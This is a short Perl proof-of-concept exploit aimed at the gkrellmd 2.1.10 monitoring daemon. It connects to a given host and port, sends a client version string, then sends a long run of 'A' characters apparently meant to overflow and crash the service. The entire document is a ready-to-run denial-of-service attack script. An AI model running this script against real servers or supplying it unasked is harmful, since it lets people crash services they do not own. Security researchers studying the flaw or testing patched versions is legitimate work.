	#!/usr/bin/perl -s
	use IO::Socket;
	#
	# proof of concept code
	# tested: grkellmd 2.1.10
	#



		if(!$ARGV[0] || !$ARGV[1])
		{ print "usage: ./gkrellmcrash.pl <host> <port>\n"; exit(-1); }

	$host = $ARGV[0];
	$port = $ARGV[1];
	$exploitstring = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

	$socket = new IO::Socket::INET
	(
	Proto    => "tcp",
	PeerAddr => $host,
	PeerPort => $port,
	);

	die "unable to connect to $host:$port ($!)\n" unless $socket;

	print $socket "gkrellm 2.1.10\n"; #tell the daemon wich client we have
	sleep(1);
	print $socket $exploitstring;

	close($socket);

